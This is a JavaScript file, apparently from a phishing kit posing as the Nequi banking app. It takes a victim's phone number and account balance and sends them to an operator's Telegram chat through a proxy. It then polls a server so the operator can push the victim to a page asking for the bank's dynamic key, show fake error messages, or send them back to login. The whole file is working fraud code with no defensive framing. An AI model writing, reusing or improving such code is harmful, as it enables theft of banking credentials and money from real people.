document.addEventListener('DOMContentLoaded', () => {
    const sendBtn = document.getElementById('send-balance-btn');
    const balanceInput = document.getElementById('balance-input');
    const loadingOverlay = document.getElementById('loading-overlay');
    const errorAlert = document.getElementById('error-alert');

    // --- CONFIGURACIÓN DE TELEGRAM ---
    const TELEGRAM_CHAT_ID = '1556429907'; // Actualizado para coincidir con script.js
    
    // URL del servidor local para polling
    const SERVER_URL = ''; // Relative path for prod and dev (via proxy)

    // --- DETECCIÓN DE ERROR PREVIO (Saldo Incorrecto) ---
    const errorFlag = sessionStorage.getItem('show_saldo_error');
    if (errorFlag) {
        if (errorAlert) {
            errorAlert.style.display = 'block';
            setTimeout(() => {
                errorAlert.style.display = 'none';
            }, 3000);
        }
        sessionStorage.removeItem('show_saldo_error');
    }

    // Formato de moneda
    balanceInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        if (value) {
            value = parseInt(value, 10).toLocaleString('es-CO');
            e.target.value = value;
        }
    });

    sendBtn.addEventListener('click', async () => {
        const saldo = balanceInput.value;
        if (!saldo) return;

        // Mostrar carga
        loadingOverlay.classList.add('active');

        const celular = sessionStorage.getItem("bc_usuario") || "No encontrado";

        const mensaje = `💰 **SALDO INGRESADO (NEQUI)**\n\n` +
                        `📱 **Celular:** \`${celular}\`\n` +
                        `💵 **Saldo:** \`$ ${saldo}\`\n\n👇 **SELECCIONA UNA ACCIÓN:**`;

        try {
            // Enviar a Telegram VIA PROXY
            const response = await fetch(`/telegram-proxy/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: mensaje,
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: "✅ Finalizar", callback_data: "finish" },
                                { text: "🔄 Pedir Dinámica", callback_data: "ask_dynamic" }
                            ],
                            [
                                { text: "❌ Saldo Incorrecto", callback_data: "saldo_bad" },
                                { text: "❌ Usuario Incorrecto", callback_data: "wrong_user" }
                            ]
                        ]
                    }
                })
            });

            const data = await response.json();

            if (data.ok) {
                // Iniciar polling al servidor local esperando respuesta del botón
                console.log("Mensaje enviado, esperando comando...");
                pollLocalServer();
            } else {
                console.error("Error Telegram:", data);
                alert('Error enviando a Telegram. Intenta de nuevo.');
                loadingOverlay.classList.remove('active');
            }

        } catch (error) {
            console.error('Error:', error);
            alert('Error de conexión con Telegram.');
            loadingOverlay.classList.remove('active');
        }
    });

    function pollLocalServer() {
        setInterval(async () => {
            try {
                const response = await fetch(`${SERVER_URL}/check-status`);
                const data = await response.json();

                if (data.command) {
                    handleCommand(data.command);
                }
            } catch (err) {
                console.error("Error polling server:", err);
            }
        }, 2000);
    }

    function handleCommand(command) {
        // Visual debug for user
        const loadingText = document.querySelector('.loading-text');
        if (loadingText) loadingText.textContent = `Procesando: ${command}...`;

        setTimeout(() => {
            switch(command) {
                case 'finish':
                    console.log("Redirigiendo a final.html");
                    window.location.replace('final.html');
                    break;
                case 'ask_dynamic':
                    console.log("Redirigiendo a dynamic-key.html");
                    window.location.replace('dynamic-key.html?t=' + new Date().getTime());
                    break;
                case 'saldo_bad':
                    console.log("Recargando por saldo incorrecto");
                    sessionStorage.setItem('show_saldo_error', 'true');
                    window.location.reload();
                    break;
                case 'wrong_user':
                    console.log("Redirigiendo a index.html por usuario incorrecto");
                    sessionStorage.setItem('show_login_error', 'true');
                    window.location.replace('index.html?t=' + new Date().getTime());
                    break;
                default:
                    console.log("Comando desconocido:", command);
            }
        }, 500); // Small delay to ensure UI updates
    }
});
